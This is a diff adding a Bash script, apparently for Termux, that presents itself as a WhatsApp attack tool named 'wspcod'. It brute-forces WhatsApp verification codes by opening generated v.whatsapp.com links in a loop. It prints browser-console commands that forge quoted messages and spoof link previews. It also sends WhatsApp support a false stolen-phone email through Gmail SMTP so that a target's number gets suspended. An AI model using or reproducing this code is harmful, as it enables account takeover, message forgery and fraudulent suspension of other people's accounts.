@@ -1,0 +1,160 @@
+#!/bin/bash
+trap ctrl_c INT
+ctrl_c(){
+exit 
+}
+banner(){
+loading "\e[1;34m[*]\e[0m loading Wspcod\e[0m"
+echo #space
+loading "\e[1;34m[*]\e[0m loading tools\e[0m"
+echo #space
+loading "\e[1;34m[*]\e[0m starting\e[0m"
+echo #space
+echo -e "\e[1;34m[+]\e[0m wspcod and its creator are not responsible for the misuse of this tool"
+echo -e "\e[1;34m[+]\e[0m type help to see required commands"
+}
+loading(){
+spin[0]="-"
+spin[1]="\\"
+spin[2]="|"
+spin[3]="/"
+spin[4]="-"
+spin[5]="\\"
+spin[6]="|"
+spin[7]="/"
+spin[8]="-"
+spin[9]="\\"
+spin[10]="|"
+spin[11]="/"
+spin[12]="-"
+spin[13]="\\"
+spin[14]="|"
+spin[15]="/"
+spin[16]="-"
+spin[17]="\\"
+spin[18]="|"
+spin[19]="/"
+spin[20]="\e[1;34mloaded\e[0m"
+echo -en "$1 ${spin[0]}"
+for i in "${spin[@]}"
+do
+echo -ne "\b$i"
+sleep 0.1
+done
+}
+banner
+
+while :;
+do
+echo -en "\e[0m\e[1;34m{${co}wspcod\e[0m\e[1;34m}\e[0m--\e[1;34m> "
+read opc
+if [[ $opc == "bruter" ]];
+then
+co="\e[1;34m"
+if [[ -x $PREFIX/bin/termux-open ]];
+then
+loading "\e[1;34m[*]\e[0m loading WhatsApp data"
+echo #space
+echo -e "\e[1;34m[+]\e[0m WhatsApp brute force"
+echo -en "\e[1;34m[!]\e[0m minutes to test security code \e[1;34m"
+read minute
+echo -e "\e[1;34m[+]\e[0m to stop brute force CTRL + C "
+loading "\e[1;34m[*]\e[0m starting with the attack"
+echo #space
+while :;
+do
+code="$((1 + RANDOM % 9))$((1 + RANDOM % 9))$((1 + RANDOM % 9))$((1 + RANDOM % 9))$((1 + RANDOM % 9))$((1 + RANDOM % 9))"
+echo -e "\e[1;34m[*]\e[0m testing whatsapp security code \e[1;34m$code\e[0m"
+termux-open https://v.whatsapp.com/$code?s=1
+sleep $minute
+done
+else
+echo -e "\e[1;34mtermux is required!\e[0m"
+fi
+elif [[ $opc == "answer" ]]
+then
+co="\e[1;34m"
+echo -en "\e[1;34m[!]\e[0m message to forge\e[1;34m "
+read msg
+sleep 1
+echo -e "\e[1;34m[+]\e[0m command console attack\e[0m "
+sleep 2
+echo -e "\e[1;34m >\e[0m command \e[1;34m:\e[0m e.__x_quotedMsg.body = '\e[1;34m$msg\e[0m';"
+sleep 1
+echo -e "\e[1;34m >\e[0m command \e[1;34m:\e[0m e.__x_quotedStanzaID = e.__x_quotedStanzaID + '_';"
+elif [[ $opc == "fakik" ]]
+then
+co="\e[1;34m"
+echo -en "\e[1;34m[!]\e[0m url to forge\e[1;34m "
+read url
+sleep 1
+echo -e "\e[1;34m[+]\e[0m command console attack\e[0m "
+sleep 2
+echo -e "\e[1;34m >\e[0m command \e[1;34m:\e[0m e.__x_body = e.__x_matchedText = '\e[1;34m$url\e[0m'"
+elif [[ $opc == "senp" ]]
+then
+co="\e[1;34m"
+loading "\e[1;34m[*]\e[0m loading Senp data"
+echo # space
+python -c '
+import smtplib
+import getpass
+import os
+g="\033[1;34m"
+m="\033[4m"
+w="\033[0m"
+number= raw_input(g+"[!]"+w+" number to suspend "+g)
+print(g+"[i]"+w+" must have access to less secure applications "+w)
+os.system("sleep 1")
+print(g+"[+]"+w+" to activate access to less secure applications, enter here "+m+"https://myaccount.google.com/lesssecureapps"+w)
+os.system("sleep 1")
+email= raw_input(g+"[!]"+w+" email "+g)
+passw= getpass.getpass(g+"[!]"+w+" password "+g)
+
+para = "support@support.whatsapp.com"
+asunto = "Soporte de WhatsApp Messenger"
+msg = number+"\nme robaron el celular"
+message = msg
+subject = asunto
+message = "Subject: {}\n\n{}".format(subject, message)
+server = smtplib.SMTP("smtp.gmail.com", 587)
+server.starttls()
+server.login(email, passw)
+server.sendmail(email, para, message)
+server.quit()
+print(g+"[+]"+w+" Suspension form has been submitted. Wait for confirmation emails.")
+
+'
+elif [[ $opc == "help" ]]
+then
+co="\e[1;34m"
+echo # space
+echo # space
+echo -e "\e[1;34mCOMMAND\e[0m \t \e[1;34mDESCRIPTION\e[0m"
+echo # space
+echo -e "\e[1;34mbruter\e[0m \t Bruter Force code WhatsApp"
+echo -e "\e[1;34manswer\e[0m \t false answer message WhatsApp"
+echo -e "\e[1;34mfakik\e[0m \t fake link on WhatsApp"
+echo -e "\e[1;34msenp\e[0m \t send to support Account WhatsApp"
+echo -e "\e[1;34mbanner\e[0m \t show banner "
+echo -e "\e[1;34mclear\e[0m \t clear wspcod "
+echo -e "\e[1;34mexit\e[0m \t exit wspcod"
+echo # space
+elif [[ $opc == "banner" ]]
+then
+co="\e[1;34m"
+banner
+elif [[ $opc == "clear" ]]
+then
+co="\e[1;34m"
+clear
+elif [[ $opc == "exit" ]]
+then
+co="\e[1;34m"
+exit
+else 
+co="\e[31m"
+fi
+done
+
+
